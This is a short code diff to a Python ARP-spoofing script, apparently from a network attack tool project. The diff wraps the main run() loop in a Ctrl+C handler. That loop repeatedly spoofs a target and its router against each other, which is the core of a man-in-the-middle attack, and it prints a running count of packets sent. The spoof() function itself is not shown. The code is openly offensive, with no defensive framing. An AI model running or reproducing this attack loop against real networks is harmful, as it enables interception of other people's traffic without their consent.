@@ -32,14 +32,17 @@ def get_ip_address():
 
 
 def run():
-    target_ip, router_ip = get_ip_address()
-    packets_sent_count = 0
-    while True:
-        spoof(target_ip, router_ip)
-        spoof(router_ip, target_ip)
-        packets_sent_count += 2
-        print(f"\r[+] Packets Sent: {packets_sent_count}", end="")
-        time.sleep(2)
+    try:
+        target_ip, router_ip = get_ip_address()
+        packets_sent_count = 0
+        while True:
+            spoof(target_ip, router_ip)
+            spoof(router_ip, target_ip)
+            packets_sent_count += 2
+            print(f"\r[+] Packets Sent: {packets_sent_count}", end="")
+            time.sleep(2)
+    except KeyboardInterrupt:
+        print("\n\n[-]Detected Ctrl+C ..... Exiting!")
 
 
 run()
